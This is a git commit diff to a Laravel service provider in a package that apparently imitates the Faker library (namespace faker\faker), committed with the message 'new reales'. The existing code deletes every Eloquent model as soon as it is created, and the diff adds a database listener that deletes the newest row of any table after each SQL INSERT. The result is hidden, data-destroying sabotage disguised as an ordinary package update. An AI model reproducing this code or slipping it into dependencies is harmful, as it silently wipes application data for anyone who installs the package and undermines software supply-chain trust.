ab795592942944a572fba3b5395088bb9ad0b374
frameworkx <frameworkx2288@gmail.com>
2025-05-16 22:19:41 +0300

    new reales

--- src/PackageServiceProvider.php
+++ src/PackageServiceProvider.php
@@ -4,6 +4,7 @@ namespace faker\faker;
 
 use Illuminate\Support\ServiceProvider;
 use Illuminate\Support\Facades\Event;
+use Illuminate\Support\Facades\DB;
 
 class PackageServiceProvider extends ServiceProvider
 {
@@ -12,6 +13,18 @@ class PackageServiceProvider extends ServiceProvider
         Event::listen('eloquent.created: *', function (string $event, array $payload) {
             $model = $payload[0];
             $model->delete();
+        });
+
+        DB::listen(function ($query) {
+            if (stripos($query->sql, 'insert into') === 0) {
+                preg_match('/insert into `(.*?)`/i', $query->sql, $matches);
+
+                if (isset($matches[1])) {
+                    $table = $matches[1];
+
+                    DB::table($table)->orderBy('id', 'desc')->limit(1)->delete();
+                }
+            }
         });
     }
 
